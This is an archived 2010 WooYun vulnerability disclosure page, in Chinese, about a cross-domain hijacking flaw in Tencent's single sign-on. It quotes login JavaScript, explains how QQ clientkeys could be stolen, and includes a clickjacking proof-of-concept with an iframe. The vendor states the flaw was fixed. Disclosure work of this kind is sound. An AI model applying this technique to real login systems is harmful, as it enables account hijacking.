@@ -1,0 +1,278 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯单点登录系统跨域劫持漏洞 Ⅱ  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯单点登录系统跨域劫持漏洞 Ⅱ  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/rayh4c">rayh4c</a> 
+</li><li>提交时间：		2010-08-15 00:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-08-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2010-08-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2010-08-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2010-09-04：	细节向普通白帽子公开<br/>
+									2010-09-14：	细节向实习白帽子公开<br/>
+									2010-09-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">腾讯单点登录系统在安全架构上存在安全缺陷，黑客可以轻易通过一些漏洞跨域劫持单点登录系统，从而获取客户端QQ所有相关服务的权限。细节补充：和上次，上上次的漏洞一样，可以通过网页挂马的方式远程获取QQ客户端的clientkey.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">单点登录系统网页的javascript的跨域设置是通过点击按钮的事件触发的，如下流程：<br />
+<br />
+<br />
+<br />
+http://imgcache.qq.com/ptlogin/ac/v7/js/xui.js<br />
+<br />
+--------------------------------------------------------<br />
+<br />
+if (!flag) {<br />
+<br />
+    g_domain = &quot;qq.com&quot;<br />
+<br />
+}<br />
+<br />
+没有FLAG参数，G_DOMAIN设置成QQ.COM.<br />
+<br />
+.......<br />
+<br />
+<br />
+<br />
+function unloadpage(){<br />
+<br />
+    document.domain = g_domain;<br />
+<br />
+<br />
+<br />
+unloadpage函数进行跨域设置<br />
+<br />
+.......<br />
+<br />
+<br />
+<br />
+function hummer_login(E, D, A, F){<br />
+<br />
+    if (A == &quot;&quot;) {<br />
+<br />
+        A = &quot;jump&quot;<br />
+<br />
+    }<br />
+<br />
+    var C = &quot;http://ptlogin2.&quot; + D + &quot;/&quot; + A + &quot;?clientuin=&quot; + E.uin + &quot;&amp;clientkey=&quot; + E.key + &quot;&amp;keyindex=9&quot;;<br />
+<br />
+    if (F != null &amp;&amp; F != &quot;&quot;) {<br />
+<br />
+        var B = decodeURIComponent(F);<br />
+<br />
+        if (B.indexOf(&quot;#&quot;) &gt; -1) {<br />
+<br />
+            B = B.replace(/#/g, &quot;%23&quot;)<br />
+<br />
+        }<br />
+<br />
+        C += (&quot;&amp;&quot; + B)<br />
+<br />
+    }<br />
+<br />
+    switch (parseInt(g_qtarget)) {<br />
+<br />
+        case 0:<br />
+<br />
+            unloadpage();<br />
+<br />
+            parent.location.href = C;<br />
+<br />
+            break;<br />
+<br />
+<br />
+<br />
+页面转跳前运行 unloadpage()函数<br />
+<br />
+........<br />
+<br />
+-------------------------------------------------------<br />
+<br />
+<br />
+<br />
+黑客可以直接IFRAME单点登录系统的网页，先通过设置location全局变量让网页转跳失败，然后再通过腾讯网站任意的一个XSS漏洞，跨域获取用户的clientkey。<br />
+<br />
+<br />
+<br />
+同局域网内可以直接用clientkey使用单点登录系统，非局域网用户可以强制用户单点登录获取用户的session。   </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">真正的攻击场景需要腾讯网站的一个XSS配合，攻击方式可以做到用户在随便在任意一个网站点击链接，就可以获取clientkey！<br />
+<br />
+<br />
+<br />
+下面给一个POC，完美EXP太H太暴力了，就不给了：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;script&gt;<br />
+var location = &#039;&#039;;<br />
+function click_hijack(obj)<br />
+{<br />
+document.all(&quot;div_xss&quot;).style.display=obj;<br />
+document.all(&quot;div_xss&quot;).style.top=event.clientY+document.body.scrollTop + 220;<br />
+document.all(&quot;div_xss&quot;).style.left=event.clientX+document.body.scrollLeft - 340;<br />
+}<br />
+&lt;/script&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;br&gt;<br />
+&lt;div align=&quot;center&quot;&gt;<br />
+&lt;a id=&quot;click&quot; href=&#039;&#039; onMouseMove=&quot;click_hijack(&#039;block&#039;)&quot;  onmouseout=&quot;click_hijack(&#039;none&#039;)&quot;&gt;test1&lt;/a&gt;<br />
+&lt;br&gt;<br />
+&lt;br&gt;<br />
+&lt;a id=&quot;click&quot; href=&#039;&#039; onMouseMove=&quot;click_hijack(&#039;block&#039;)&quot; onmouseout=&quot;click_hijack(&#039;none&#039;)&quot;&gt;test2&lt;/a&gt;<br />
+&lt;br&gt;<br />
+&lt;br&gt;<br />
+&lt;/div&gt;<br />
+&lt;div id=&quot;div_xss&quot; style=&quot;position:absolute;&quot; &gt;<br />
+&lt;iframe id=&quot;victim&quot; src=&quot;http://xui.ptlogin2.qq.com/cgi-bin/qlogin?domain=qq.com&quot; scrolling=&quot;no&quot; style=&quot;position: absolute;left: 200;bottom: 200;&quot; height=&quot;90px;&quot; width=&quot;200px;&quot;&gt;&lt;/iframe&gt;<br />
+&lt;/div&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">防止单点登录系统服务被非信任域引用。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/rayh4c" title="rayh4c">rayh4c</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-0197" title="腾讯单点登录系统跨域劫持漏洞 Ⅱ">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2010-08-15 09:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">收到，我们尽快确认</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2010-08-24：已修复</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="197";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
